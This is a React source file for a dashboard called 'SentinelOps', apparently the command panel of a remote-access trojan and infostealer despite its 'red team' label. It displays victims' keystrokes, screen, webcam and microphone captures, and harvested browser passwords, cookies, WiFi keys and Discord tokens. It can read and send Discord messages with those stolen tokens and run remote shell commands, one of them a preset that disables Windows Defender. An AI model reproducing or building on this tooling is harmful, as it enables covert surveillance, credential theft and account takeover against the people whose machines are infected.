import { useCallback, useEffect, useMemo, useState } from 'react';
import { discordRequest, getLatestVersion, proxyFetch, proxyPost } from './api.js';

const PAGE_SIZE = 25;
const TABS = [
  { id: 'activity', label: 'Activity', icon: '⌨' },
  { id: 'screenshots', label: 'Screenshots', icon: '▣' },
  { id: 'triggers', label: 'Triggers', icon: '◎' },
  { id: 'shell', label: 'Shell', icon: '>' },
  { id: 'passwords', label: 'Passwords', icon: '🔑' },
  { id: 'cookies', label: 'Cookies', icon: '◌' },
  { id: 'wifi', label: 'WiFi', icon: '◔' },
  { id: 'discord', label: 'Discord', icon: '◈' }
];

function cx(...parts) {
  return parts.filter(Boolean).join(' ');
}

function displayHost(host, aliases) {
  return aliases[host] || host || '-';
}

function formatDate(value) {
  if (!value) return '-';
  const ts = value.replace(/Z$|[+\-]\d{2}:?\d{2}$/, '') + 'Z';
  return new Date(ts).toLocaleString();
}

function ago(value) {
  if (!value) return 'never';
  const diff = Date.now() - new Date(value).getTime();
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return 'just now';
  if (mins < 60) return `${mins}m ago`;
  const hrs = Math.floor(mins / 60);
  if (hrs < 24) return `${hrs}h ago`;
  return `${Math.floor(hrs / 24)}d ago`;
}

function getDeviceState(lastSeen) {
  if (!lastSeen) return { label: 'offline', color: 'var(--red)' };
  const diffMin = (Date.now() - new Date(lastSeen).getTime()) / 60000;
  if (diffMin < 2) return { label: 'active', color: 'var(--green)' };
  if (diffMin < 5) return { label: 'idle', color: 'var(--amber)' };
  return { label: 'offline', color: 'var(--red)' };
}

function isSpam(text) {
  if (!text) return false;
  const lower = text.toLowerCase();
  if (lower.length > 18 && /(.)\1{8,}/.test(lower)) return true;
  if (/^(\[[^\]]+\])+$/.test(lower) && lower.length > 24) return true;
  const unique = new Set(lower).size;
  return lower.length > 30 && unique < Math.max(4, lower.length / 8);
}

function mask(value) {
  if (!value) return '(empty)';
  return '•'.repeat(Math.min(20, value.length));
}

function useAliases() {
  const [aliases, setAliases] = useState(() => {
    try { return JSON.parse(localStorage.getItem('hostAliases') || '{}'); } catch { return {}; }
  });
  useEffect(() => {
    localStorage.setItem('hostAliases', JSON.stringify(aliases));
  }, [aliases]);
  return [aliases, setAliases];
}

function StatusDot({ color }) {
  return <span className="status-dot" style={{ backgroundColor: color, boxShadow: `0 0 10px ${color}` }} />;
}

function Panel({ title, subtitle, actions, children }) {
  return (
    <section className="glass">
      {(title || actions) && (
        <div className="panel-head">
          <div>
            {title && <div style={{ fontSize: 16, fontWeight: 600 }}>{title}</div>}
            {subtitle && <div className="page-subtitle">{subtitle}</div>}
          </div>
          {actions}
        </div>
      )}
      <div className="panel-body">{children}</div>
    </section>
  );
}

function App() {
  const [tab, setTab] = useState('activity');
  const [selectedHost, setSelectedHost] = useState('');
  const [aliases, setAliases] = useAliases();
  const [latestVersion, setLatestVersion] = useState(null);
  const [heartbeats, setHeartbeats] = useState([]);
  const [harvestPaused, setHarvestPaused] = useState(false);
  const [keys, setKeys] = useState([]);
  const [activityPage, setActivityPage] = useState(0);
  const [activityLastPage, setActivityLastPage] = useState(false);
  const [windowFilter, setWindowFilter] = useState('');
  const [showSpam, setShowSpam] = useState(false);
  const [screenshots, setScreenshots] = useState([]);
  const [triggers, setTriggers] = useState([]);
  const [triggerInput, setTriggerInput] = useState('');
  const [execResults, setExecResults] = useState([]);
  const [shellInput, setShellInput] = useState('');
  const [passwords, setPasswords] = useState([]);
  const [cookies, setCookies] = useState([]);
  const [wifiRows, setWifiRows] = useState([]);
  const [discordRows, setDiscordRows] = useState([]);
  const [discordToken, setDiscordToken] = useState('');
  const [discordGuilds, setDiscordGuilds] = useState([]);
  const [discordChannels, setDiscordChannels] = useState([]);
  const [discordMessages, setDiscordMessages] = useState([]);
  const [discordGuildName, setDiscordGuildName] = useState('');
  const [discordGuildId, setDiscordGuildId] = useState('');
  const [discordChannelId, setDiscordChannelId] = useState('');
  const [discordChannelName, setDiscordChannelName] = useState('');
  const [discordMsgInput, setDiscordMsgInput] = useState('');
  const [toasts, setToasts] = useState([]);
  const [aliasModalHost, setAliasModalHost] = useState('');
  const [aliasDraft, setAliasDraft] = useState('');
  const [busy, setBusy] = useState({});

  const pushToast = useCallback((message, type = 'info') => {
    const id = Date.now() + Math.random();
    setToasts((prev) => [...prev, { id, message, type }]);
    setTimeout(() => setToasts((prev) => prev.filter((t) => t.id !== id)), 3000);
  }, []);

  const setBusyFlag = (key, value) => setBusy((prev) => ({ ...prev, [key]: value }));

  const fetchHeartbeat = useCallback(async () => {
    try {
      const data = await proxyFetch('/rest/v1/heartbeat?select=hostname,last_seen,version&order=hostname.asc');
      setHeartbeats(data || []);
    } catch {
      // silent like old UI
    }
  }, []);

  const fetchHarvestState = useCallback(async () => {
    try {
      const data = await proxyFetch('/rest/v1/agent_config?key=eq.harvest_paused&select=value');
      if (data?.length) setHarvestPaused(data[0].value === 'true');
    } catch {}
  }, []);

  const fetchActivity = useCallback(async (resetPage = false) => {
    const nextPage = resetPage ? 0 : activityPage;
    if (resetPage) setActivityPage(0);
    let path = `/rest/v1/keystrokes?select=created_at,hostname,window_title,keys,version&order=created_at.desc&limit=${PAGE_SIZE}&offset=${nextPage * PAGE_SIZE}`;
    if (selectedHost) path += `&hostname=eq.${encodeURIComponent(selectedHost)}`;
    if (windowFilter.trim()) path += `&window_title=ilike.${encodeURIComponent(`*${windowFilter.trim()}*`)}`;
    const data = await proxyFetch(path);
    setKeys(data || []);
    setActivityLastPage(!data || data.length < PAGE_SIZE);
  }, [activityPage, selectedHost, windowFilter]);

  const fetchScreenshots = useCallback(async () => {
    const data = await proxyFetch('/rest/v1/control?or=(command.eq.screenshot,command.eq.webcam,command.eq.speaker)&executed=eq.true&order=created_at.desc&limit=50&select=id,created_at,hostname,result_url,command');
    setScreenshots(data || []);
  }, []);

  const fetchTriggers = useCallback(async () => {
    const data = await proxyFetch('/rest/v1/screenshot_triggers?select=id,keyword&order=id.asc');
    setTriggers(data || []);
  }, []);

  const fetchExecResults = useCallback(async () => {
    const data = await proxyFetch('/rest/v1/exec_results?select=id,created_at,hostname,command,output,exit_code&order=created_at.desc&limit=50');
    setExecResults(data || []);
  }, []);

  const fetchPasswords = useCallback(async () => {
    const data = await proxyFetch('/rest/v1/passwords?select=id,created_at,hostname,browser,origin_url,username_value,password_value&order=created_at.desc&limit=100');
    setPasswords(data || []);
  }, []);

  const fetchCookies = useCallback(async () => {
    const data = await proxyFetch('/rest/v1/cookies?select=id,created_at,hostname,browser,domain,name,value&order=created_at.desc&limit=200');
    setCookies(data || []);
  }, []);

  const fetchWifi = useCallback(async () => {
    const data = await proxyFetch('/rest/v1/wifi_creds?select=id,created_at,hostname,ssid,password,security,ipv4&order=created_at.desc&limit=50');
    setWifiRows(data || []);
  }, []);

  const fetchDiscordTokens = useCallback(async () => {
    const data = await proxyFetch('/rest/v1/discord_tokens?select=id,created_at,hostname,token&order=created_at.desc&limit=50');
    if (!data?.length) {
      setDiscordRows([]);
      setDiscordToken('');
      return;
    }
    const rows = await Promise.all(data.map(async (row) => {
      let valid = false;
      let userInfo = '';
      if (row.token) {
        try {
          const user = await discordRequest(row.token, '/users/@me');
          valid = true;
          userInfo = `${user.global_name || user.username || ''}${user.discriminator && user.discriminator !== '0' ? `#${user.discriminator}` : ''}`;
        } catch {}
      }
      return { ...row, valid, userInfo };
    }));
    setDiscordRows(rows);
    const firstValid = rows.find((r) => r.valid)?.token || '';
    if (!discordToken && firstValid) setDiscordToken(firstValid);
  }, [discordToken]);

  const refreshActiveTab = useCallback(() => {
    if (tab === 'activity') return fetchActivity();
    if (tab === 'screenshots') return fetchScreenshots();
    if (tab === 'triggers') return fetchTriggers();
    if (tab === 'shell') return fetchExecResults();
    if (tab === 'passwords') return fetchPasswords();
    if (tab === 'cookies') return fetchCookies();
    if (tab === 'wifi') return fetchWifi();
    if (tab === 'discord') return fetchDiscordTokens();
  }, [tab, fetchActivity, fetchScreenshots, fetchTriggers, fetchExecResults, fetchPasswords, fetchCookies, fetchWifi, fetchDiscordTokens]);

  useEffect(() => {
    getLatestVersion().then(setLatestVersion).catch(() => {});
    fetchHeartbeat();
    fetchHarvestState();
    fetchActivity(true).catch(() => {});
    const hb = setInterval(fetchHeartbeat, 10000);
    const refresh = setInterval(() => refreshActiveTab()?.catch?.(() => {}), 20000);
    return () => {
      clearInterval(hb);
      clearInterval(refresh);
    };
  }, []);

  useEffect(() => {
    refreshActiveTab()?.catch?.(() => {});
  }, [tab]);

  useEffect(() => {
    const id = setTimeout(() => {
      if (tab === 'activity') fetchActivity(true).catch(() => {});
    }, 300);
    return () => clearTimeout(id);
  }, [windowFilter, selectedHost, showSpam]);

  useEffect(() => {
    if (tab === 'activity') fetchActivity().catch(() => {});
  }, [activityPage]);

  const onlineCounts = useMemo(() => {
    return heartbeats.reduce((acc, row) => {
      const s = getDeviceState(row.last_seen).label;
      acc[s] += 1;
      return acc;
    }, { active: 0, idle: 0, offline: 0 });
  }, [heartbeats]);

  const filteredKeys = useMemo(() => keys.filter((row) => showSpam || !isSpam(row.keys || '')), [keys, showSpam]);
  const scopedScreenshots = useMemo(() => selectedHost ? screenshots.filter((r) => r.hostname === selectedHost) : screenshots, [screenshots, selectedHost]);
  const scopedExecResults = useMemo(() => selectedHost ? execResults.filter((r) => r.hostname === selectedHost) : execResults, [execResults, selectedHost]);
  const scopedPasswords = useMemo(() => selectedHost ? passwords.filter((r) => r.hostname === selectedHost) : passwords, [passwords, selectedHost]);
  const scopedCookies = useMemo(() => selectedHost ? cookies.filter((r) => r.hostname === selectedHost) : cookies, [cookies, selectedHost]);
  const scopedWifi = useMemo(() => selectedHost ? wifiRows.filter((r) => r.hostname === selectedHost) : wifiRows, [wifiRows, selectedHost]);
  const scopedDiscordRows = useMemo(() => selectedHost ? discordRows.filter((r) => r.hostname === selectedHost) : discordRows, [discordRows, selectedHost]);

  const ensureHost = () => {
    if (!selectedHost) {
      pushToast('Select a device first', 'error');
      return false;
    }
    return true;
  };

  const sendControl = async (command, extra = {}, okText = `${command} sent`) => {
    if (!ensureHost()) return;
    await proxyPost('/rest/v1/control', { command, hostname: selectedHost, executed: false, ...extra });
    pushToast(okText, 'success');
  };

  const runNamed = async (key, fn) => {
    try {
      setBusyFlag(key, true);
      await fn();
    } catch (err) {
      pushToast(`Failed: ${err.message}`, 'error');
    } finally {
      setBusyFlag(key, false);
    }
  };

  const toggleHarvest = () => runNamed('harvest', async () => {
    const next = harvestPaused ? 'false' : 'true';
    await proxyPost('/rest/v1/agent_config?key=eq.harvest_paused', { key: 'harvest_paused', value: next }, 'PUT', { 'x-upsert': 'true' });
    setHarvestPaused(!harvestPaused);
    pushToast(`${harvestPaused ? 'Resumed' : 'Paused'} harvest globally`, 'success');
  });

  const saveAlias = () => {
    if (!aliasModalHost) return;
    setAliases((prev) => {
      const next = { ...prev };
      if (aliasDraft.trim()) next[aliasModalHost] = aliasDraft.trim();
      else delete next[aliasModalHost];
      return next;
    });
    setAliasModalHost('');
    setAliasDraft('');
  };

  const passwordHost = heartbeats.find((d) => d.hostname === selectedHost);
  const currentHostLabel = selectedHost ? displayHost(selectedHost, aliases) : 'All devices';

  return (
    <div className="app-shell">
      <aside className="sidebar">
        <div className="logo">
          <div className="logo-badge">S</div>
          <div className="logo-copy">
            <div style={{ fontWeight: 700 }}>SentinelOps</div>
            <small>red team control surface</small>
          </div>
        </div>

        <div className="nav-list">
          {TABS.map((item) => (
            <button key={item.id} className={cx('nav-btn', tab === item.id && 'active')} onClick={() => setTab(item.id)}>
              <span className="nav-icon">{item.icon}</span>
              <span>{item.label}</span>
            </button>
          ))}
        </div>

        <div className="sidebar-section">
          <div className="sidebar-label">Device status</div>
          <div className="status-stack">
            <div className="status-pill"><span><StatusDot color="var(--green)" />Active</span><strong className="mono">{onlineCounts.active}</strong></div>
            <div className="status-pill"><span><StatusDot color="var(--amber)" />Idle</span><strong className="mono">{onlineCounts.idle}</strong></div>
            <div className="status-pill"><span><StatusDot color="var(--red)" />Offline</span><strong className="mono">{onlineCounts.offline}</strong></div>
          </div>
        </div>

        <div className="sidebar-section">
          <div className="sidebar-label">Tracked devices</div>
          <div className="host-chip-row">
            {heartbeats.map((row) => {
              const state = getDeviceState(row.last_seen);
              return (
                <button key={row.hostname} className={cx('host-chip', selectedHost === row.hostname && 'active')} onClick={() => setSelectedHost(row.hostname)} title={`${formatDate(row.last_seen)} · v${row.version ?? '-'}`}>
                  <StatusDot color={state.color} />{displayHost(row.hostname, aliases)}
                </button>
              );
            })}
          </div>
        </div>
      </aside>

      <main className="main">
        <header className="topbar">
          <select className="select" value={selectedHost} onChange={(e) => setSelectedHost(e.target.value)} style={{ minWidth: 220 }}>
            <option value="">All devices</option>
            {heartbeats.map((row) => <option key={row.hostname} value={row.hostname}>{displayHost(row.hostname, aliases)}</option>)}
          </select>
          <div className="mono" style={{ color: 'var(--text-soft)', fontSize: 12 }}>{passwordHost ? `${ago(passwordHost.last_seen)} · v${passwordHost.version ?? '-'}` : 'Select a device'}</div>
          <div style={{ flex: 1 }} />
          <button className="btn danger" disabled={busy.stop} onClick={() => runNamed('stop', () => sendControl('stop', {}, `Stop command sent to ${selectedHost}`))}>Stop</button>
          <button className="btn danger" disabled={busy.destruct} onClick={() => {
            if (!selectedHost) return pushToast('Select a device first', 'error');
            if (!window.confirm(`Permanently kill the agent on "${selectedHost}"?`)) return;
            runNamed('destruct', () => sendControl('selfdestruct', {}, `Self destruct sent to ${selectedHost}`));
          }}>Self Destruct</button>
          <button className={cx('btn', harvestPaused ? 'success' : 'warn')} disabled={busy.harvest} onClick={toggleHarvest}>{harvestPaused ? 'Resume Harvest' : 'Pause Harvest'}</button>
        </header>

        <div className="main-scroll">
          <div>
            <h1 className="page-title">{TABS.find((t) => t.id === tab)?.label}</h1>
            <p className="page-subtitle">Operating context: {currentHostLabel}</p>
          </div>

          {tab === 'activity' && (
            <>
              <div className="stats-grid">
                <div className="glass stat-card"><div className="stat-label">Visible rows</div><div className="stat-value">{filteredKeys.length}</div></div>
                <div className="glass stat-card"><div className="stat-label">Current page</div><div className="stat-value">{activityPage + 1}</div></div>
                <div className="glass stat-card"><div className="stat-label">Latest build</div><div className="stat-value">{latestVersion ?? '...'}</div></div>
                <div className="glass stat-card"><div className="stat-label">Device scope</div><div className="stat-value" style={{ fontSize: 16 }}>{currentHostLabel}</div></div>
              </div>

              <Panel title="Live keystroke feed" subtitle="Filter by device and window context. Click a hostname to assign a friendly alias." actions={<div className="toolbar"><input className="input" placeholder="Window filter..." value={windowFilter} onChange={(e) => setWindowFilter(e.target.value)} /><label className="badge"><input type="checkbox" checked={showSpam} onChange={(e) => setShowSpam(e.target.checked)} /> Show spam</label></div>}>
                <div className="table-wrap">
                  <table>
                    <thead><tr><th>Time</th><th>Host</th><th>Window</th><th>Version</th><th>Payload</th></tr></thead>
                    <tbody>
                      {filteredKeys.length === 0 ? (
                        <tr><td colSpan="5" className="empty">No keystrokes recorded for the current filter.</td></tr>
                      ) : filteredKeys.map((row) => {
                        const isClipboard = row.window_title === '[CLIPBOARD]';
                        const isPassword = (row.window_title || '').startsWith('[PASSWORD]');
                        const verClass = latestVersion != null && row.version != null ? (row.version >= latestVersion ? 'var(--green)' : 'var(--amber)') : 'var(--text-soft)';
                        return (
                          <tr key={`${row.created_at}-${row.hostname}-${row.keys?.slice(0, 12)}`}>
                            <td>{formatDate(row.created_at)}</td>
                            <td><button className="btn" style={{ padding: '6px 10px' }} onClick={() => { setAliasModalHost(row.hostname); setAliasDraft(aliases[row.hostname] || ''); }}>{displayHost(row.hostname, aliases)}</button></td>
                            <td>
                              {isClipboard ? <span className="badge" style={{ color: 'var(--purple)' }}>Clipboard</span> : isPassword ? <span className="badge" style={{ color: 'var(--red)' }}>Password</span> : row.window_title}
                            </td>
                            <td className="mono" style={{ color: verClass }}>v{row.version ?? '-'}</td>
                            <td className="mono">{row.keys}</td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                </div>
                <div className="actions-row" style={{ marginTop: 14 }}>
                  <button className="btn" disabled={activityPage === 0} onClick={() => { setActivityPage((p) => p - 1); }}>Previous</button>
                  <button className="btn" disabled={activityLastPage} onClick={() => { setActivityPage((p) => p + 1); }}>Next</button>
                </div>
              </Panel>
            </>
          )}

          {tab === 'screenshots' && (
            <Panel title="Capture gallery" subtitle="Screenshots, webcam captures, and speaker recordings from the selected device." actions={<div className="actions-row"><button className="btn primary" disabled={busy.cap} onClick={() => runNamed('cap', () => sendControl('screenshot', {}, `Screenshot requested from ${selectedHost}`))}>Capture Screen</button><button className="btn purple" disabled={busy.webcam} onClick={() => runNamed('webcam', () => sendControl('webcam', {}, `Webcam requested from ${selectedHost}`))}>Capture Webcam</button><button className="btn warn" disabled={busy.speaker} onClick={() => runNamed('speaker', () => sendControl('speaker', {}, `Speaker requested from ${selectedHost}`))}>Capture Speaker</button></div>}>
              <div className="grid-cards">
                {scopedScreenshots.length === 0 ? <div className="empty">No captures yet.</div> : scopedScreenshots.map((row) => {
                  const speaker = row.command === 'speaker';
                  const webcam = row.command === 'webcam';
                  return (
                    <div className="glass gallery-card" key={row.id} style={{ overflow: 'hidden' }}>
                      {speaker ? (
                        <div style={{ height: 200, display: 'flex', alignItems: 'center', justifyContent: 'center' }}><a className="btn warn" href={row.result_url} target="_blank" rel="noreferrer">Download Audio</a></div>
                      ) : (
                        <img src={row.result_url} alt={row.command} onClick={() => window.open(row.result_url, '_blank')} />
                      )}
                      <div className="gallery-meta"><span>{displayHost(row.hostname, aliases)} {webcam ? '(webcam)' : speaker ? '(speaker)' : ''}</span><span>{formatDate(row.created_at)}</span></div>
                    </div>
                  );
                })}
              </div>
            </Panel>
          )}

          {tab === 'triggers' && (
            <Panel title="Auto-screenshot triggers" subtitle="When a window title contains one of these keywords, the agent captures a screenshot." actions={<div className="toolbar"><input className="input" placeholder="Add keyword..." value={triggerInput} onChange={(e) => setTriggerInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && runNamed('addTrigger', async () => { if (!triggerInput.trim()) return pushToast('Enter a keyword', 'error'); await proxyPost('/rest/v1/screenshot_triggers', { keyword: triggerInput.trim().toLowerCase() }); setTriggerInput(''); await fetchTriggers(); pushToast('Trigger added', 'success'); })} /><button className="btn success" onClick={() => runNamed('addTrigger', async () => { if (!triggerInput.trim()) return pushToast('Enter a keyword', 'error'); await proxyPost('/rest/v1/screenshot_triggers', { keyword: triggerInput.trim().toLowerCase() }); setTriggerInput(''); await fetchTriggers(); pushToast('Trigger added', 'success'); })}>Add</button></div>}>
              <div className="table-wrap"><table><thead><tr><th>Keyword</th><th>Action</th></tr></thead><tbody>{triggers.length === 0 ? <tr><td colSpan="2" className="empty">No triggers set.</td></tr> : triggers.map((row) => <tr key={row.id}><td className="mono">{row.keyword}</td><td><button className="btn danger" onClick={() => runNamed(`trigger-${row.id}`, async () => { await proxyFetch(`/rest/v1/screenshot_triggers?id=eq.${row.id}`, { method: 'DELETE', headers: {} }); await fetchTriggers(); pushToast('Trigger deleted', 'success'); })}>Delete</button></td></tr>)}</tbody></table></div>
            </Panel>
          )}

          {tab === 'shell' && (
            <Panel title="Remote shell" subtitle="Run commands on the selected device and inspect recent output.">
              <div className="actions-row" style={{ marginBottom: 14 }}>
                <button className="btn danger" onClick={() => setShellInput('shutdown /s /t 0')}>Shutdown</button>
                <button className="btn warn" onClick={() => setShellInput('shutdown /r /t 0')}>Restart</button>
                <button className="btn" onClick={() => setShellInput('rundll32.exe user32.dll,LockWorkStation')}>Lock</button>
                <button className="btn" onClick={() => { const url = window.prompt('Enter URL to open:'); if (url) setShellInput(`start "" "${url.trim()}"`); }}>Open URL</button>
                <button className="btn" onClick={() => runNamed('wifi', () => sendControl('wifi', {}, `WiFi harvest triggered for ${selectedHost}`))}>WiFi Dump</button>
                <button className="btn danger" onClick={() => setShellInput('powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true"')}>Disable Defender</button>
                <button className="btn" onClick={() => setShellInput('systeminfo | findstr /B /C:"OS Name" /C:"System Boot Time" /C:"Total Physical Memory"')}>Sys Info</button>
              </div>
              <div className="toolbar" style={{ marginBottom: 14 }}>
                <input className="input mono" style={{ flex: 1 }} value={shellInput} onChange={(e) => setShellInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && runNamed('exec', async () => { if (!ensureHost() || !shellInput.trim()) return; await sendControl('exec', { payload: shellInput.trim() }, `Exec sent to ${selectedHost}`); setShellInput(''); await fetchExecResults(); })} placeholder="Enter command..." />
                <button className="btn primary" disabled={busy.exec} onClick={() => runNamed('exec', async () => { if (!ensureHost() || !shellInput.trim()) return; await sendControl('exec', { payload: shellInput.trim() }, `Exec sent to ${selectedHost}`); setShellInput(''); await fetchExecResults(); })}>Execute</button>
              </div>
              <div className="table-wrap"><table><thead><tr><th>Time</th><th>Host</th><th>Command</th><th>Output</th></tr></thead><tbody>{scopedExecResults.length === 0 ? <tr><td colSpan="4" className="empty">No commands executed yet.</td></tr> : scopedExecResults.map((row) => <tr key={row.id}><td>{formatDate(row.created_at)}</td><td>{displayHost(row.hostname, aliases)}</td><td className="mono">$ {row.command}</td><td><div className="mono" style={{ color: row.exit_code === 0 ? 'var(--green)' : 'var(--red)', fontSize: 12, marginBottom: 6 }}>exit {row.exit_code}</div><details><summary style={{ cursor: 'pointer', color: 'var(--text-soft)' }}>toggle output</summary><pre className="mono" style={{ whiteSpace: 'pre-wrap', wordBreak: 'break-word', margin: '10px 0 0' }}>{row.output}</pre></details></td></tr>)}</tbody></table></div>
            </Panel>
          )}

          {tab === 'passwords' && (
            <Panel title="Browser passwords" subtitle="Harvested credentials from Chrome-family browsers.">
              <div className="table-wrap"><table><thead><tr><th>Time</th><th>Host</th><th>Browser</th><th>Site</th><th>Username</th><th>Password</th></tr></thead><tbody>{scopedPasswords.length === 0 ? <tr><td colSpan="6" className="empty">No passwords harvested yet.</td></tr> : scopedPasswords.map((row) => <PasswordRow key={row.id} row={row} aliases={aliases} />)}</tbody></table></div>
            </Panel>
          )}

          {tab === 'cookies' && (
            <Panel title="Browser cookies" subtitle="Base64 cookie values with one-click copy.">
              <div className="table-wrap"><table><thead><tr><th>Time</th><th>Host</th><th>Browser</th><th>Domain</th><th>Name</th><th>Value</th></tr></thead><tbody>{scopedCookies.length === 0 ? <tr><td colSpan="6" className="empty">No cookies harvested yet.</td></tr> : scopedCookies.map((row) => <CookieRow key={row.id} row={row} aliases={aliases} pushToast={pushToast} />)}</tbody></table></div>
            </Panel>
          )}

          {tab === 'wifi' && (
            <Panel title="Saved WiFi credentials" subtitle="Collected SSID, password, security mode, and IPv4.">
              <div className="table-wrap"><table><thead><tr><th>Time</th><th>Host</th><th>SSID</th><th>Password</th><th>Security</th><th>IP</th></tr></thead><tbody>{scopedWifi.length === 0 ? <tr><td colSpan="6" className="empty">No WiFi credentials harvested yet.</td></tr> : scopedWifi.map((row) => <WifiRow key={row.id} row={row} aliases={aliases} />)}</tbody></table></div>
            </Panel>
          )}

          {tab === 'discord' && (
            <>
              <Panel title="Discord token manager" subtitle="Validate harvested tokens, browse guilds/channels, and send messages.">
                <div className="table-wrap"><table><thead><tr><th>Time</th><th>Host</th><th>Token</th><th>Action</th></tr></thead><tbody>{scopedDiscordRows.length === 0 ? <tr><td colSpan="4" className="empty">No Discord tokens found yet.</td></tr> : scopedDiscordRows.map((row) => <DiscordTokenRow key={row.id} row={row} aliases={aliases} setDiscordToken={setDiscordToken} pushToast={pushToast} />)}</tbody></table></div>
              </Panel>

              <Panel title="Discord workspace" subtitle={discordToken ? `Active token: ${discordToken.slice(0, 10)}...` : 'Select a valid token above first'} actions={<div className="actions-row"><button className="btn primary" disabled={!discordToken || busy.guilds} onClick={() => runNamed('guilds', async () => { const guilds = await discordRequest(discordToken, '/users/@me/guilds'); setDiscordGuilds(guilds || []); setDiscordChannels([]); setDiscordMessages([]); })}>List Servers</button><button className="btn success" disabled={busy.forceDiscord} onClick={() => runNamed('forceDiscord', () => sendControl('force_discord', {}, `Discord harvest triggered for ${selectedHost}`))}>Force Harvest</button></div>}>
                <div className="three-col">
                  <div className="glass" style={{ overflow: 'hidden' }}>
                    <div className="panel-head"><div>Servers</div></div>
                    <div className="list-box">{discordGuilds.length === 0 ? <div className="empty">Load servers first.</div> : discordGuilds.map((guild) => <div key={guild.id} className={cx('list-item', guild.id === discordGuildId && 'active')} onClick={() => runNamed(`guild-${guild.id}`, async () => { setDiscordGuildId(guild.id); const channels = await discordRequest(discordToken, `/guilds/${guild.id}/channels`); setDiscordChannels((channels || []).filter((c) => c.type === 0)); setDiscordGuildName(guild.name); setDiscordMessages([]); setDiscordChannelName(''); setDiscordChannelId(''); })}>{guild.name}</div>)}</div>
                  </div>
                  <div className="glass" style={{ overflow: 'hidden' }}>
                    <div className="panel-head"><div>{discordGuildName || 'Channels'}</div></div>
                    <div className="list-box">{discordChannels.length === 0 ? <div className="empty">Select a server.</div> : discordChannels.map((channel) => <div key={channel.id} className={cx('list-item', discordChannelId === channel.id && 'active')} onClick={() => runNamed(`channel-${channel.id}`, async () => { setDiscordChannelId(channel.id); setDiscordChannelName(channel.name); const messages = await discordRequest(discordToken, `/channels/${channel.id}/messages?limit=25`); setDiscordMessages((messages || []).slice().reverse()); })}># {channel.name}</div>)}</div>
                  </div>
                  <div className="glass" style={{ overflow: 'hidden' }}>
                    <div className="panel-head"><div>{discordChannelName ? `# ${discordChannelName}` : 'Messages'}</div><div className="mono" style={{ color: 'var(--muted)', fontSize: 11 }}>{discordChannelId}</div></div>
                    <div className="panel-body">
                      <div className="messages-box">{discordMessages.length === 0 ? <div className="empty">Select a channel.</div> : discordMessages.map((msg) => <div className="message-card" key={msg.id}><div style={{ marginBottom: 6 }}><strong style={{ color: 'var(--green)' }}>{msg.author?.global_name || msg.author?.username || 'unknown'}</strong> <span className="mono" style={{ color: 'var(--muted)', fontSize: 11 }}>{msg.timestamp ? new Date(msg.timestamp).toLocaleTimeString() : ''}</span></div><div style={{ fontSize: 13, lineHeight: 1.55, whiteSpace: 'pre-wrap' }}>{msg.content}</div>{msg.attachments?.map((a) => <div key={a.id || a.url} style={{ marginTop: 6 }}><a href={a.url} target="_blank" rel="noreferrer" style={{ color: 'var(--blue)' }}>{a.filename}</a></div>)}</div>)}</div>
                      <div className="toolbar" style={{ marginTop: 14 }}><input className="input" style={{ flex: 1 }} value={discordMsgInput} onChange={(e) => setDiscordMsgInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && runNamed('discordSend', async () => { if (!discordChannelId || !discordMsgInput.trim()) return; await discordRequest(discordToken, `/channels/${discordChannelId}/messages`, { method: 'POST', body: JSON.stringify({ content: discordMsgInput.trim() }) }); setDiscordMsgInput(''); const messages = await discordRequest(discordToken, `/channels/${discordChannelId}/messages?limit=25`); setDiscordMessages((messages || []).slice().reverse()); pushToast('Message sent', 'success'); })} placeholder="Type a message..." /><button className="btn success" disabled={!discordChannelId || busy.discordSend} onClick={() => runNamed('discordSend', async () => { if (!discordChannelId || !discordMsgInput.trim()) return; await discordRequest(discordToken, `/channels/${discordChannelId}/messages`, { method: 'POST', body: JSON.stringify({ content: discordMsgInput.trim() }) }); setDiscordMsgInput(''); const messages = await discordRequest(discordToken, `/channels/${discordChannelId}/messages?limit=25`); setDiscordMessages((messages || []).slice().reverse()); pushToast('Message sent', 'success'); })}>Send</button></div>
                    </div>
                  </div>
                </div>
              </Panel>
            </>
          )}
        </div>
      </main>

      <div className="toast-stack">{toasts.map((toast) => <div key={toast.id} className={cx('toast', toast.type)}>{toast.message}</div>)}</div>

      {aliasModalHost && (
        <div className="modal-backdrop" onClick={() => setAliasModalHost('')}>
          <div className="glass modal" onClick={(e) => e.stopPropagation()}>
            <div className="panel-head"><div>Rename device</div></div>
            <div className="panel-body">
              <div className="page-subtitle" style={{ marginBottom: 12 }}>{aliasModalHost}</div>
              <input className="input" value={aliasDraft} onChange={(e) => setAliasDraft(e.target.value)} placeholder="Friendly name..." style={{ width: '100%' }} />
              <div className="actions-row" style={{ marginTop: 14 }}>
                <button className="btn success" onClick={saveAlias}>Save</button>
                <button className="btn" onClick={() => { setAliasModalHost(''); setAliasDraft(''); }}>Cancel</button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function PasswordRow({ row, aliases }) {
  const [revealed, setRevealed] = useState(false);
  const favicon = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(row.origin_url || '')}&sz=16`;
  return <tr><td>{formatDate(row.created_at)}</td><td>{displayHost(row.hostname, aliases)}</td><td><span className="badge">{row.browser}</span></td><td><img src={favicon} alt="" style={{ width: 16, height: 16, marginRight: 6, verticalAlign: 'middle' }} /><span>{row.origin_url}</span></td><td className="mono">{row.username_value}</td><td><button className="btn" style={{ padding: '6px 10px' }} onClick={() => setRevealed(!revealed)}>{revealed ? row.password_value : mask(row.password_value)}</button></td></tr>;
}

function CookieRow({ row, aliases, pushToast }) {
  const isHarvest = row.domain === '[HARVEST]';
  return <tr><td>{formatDate(row.created_at)}</td><td>{displayHost(row.hostname, aliases)}</td><td><span className="badge">{row.browser}</span></td><td>{row.domain}</td><td className="mono">{row.name}</td><td>{isHarvest ? row.value : <button className="btn" style={{ padding: '6px 10px' }} onClick={async () => { await navigator.clipboard.writeText(row.value || ''); pushToast('Cookie copied', 'success'); }}>Copy</button>}</td></tr>;
}

function WifiRow({ row, aliases }) {
  const [revealed, setRevealed] = useState(false);
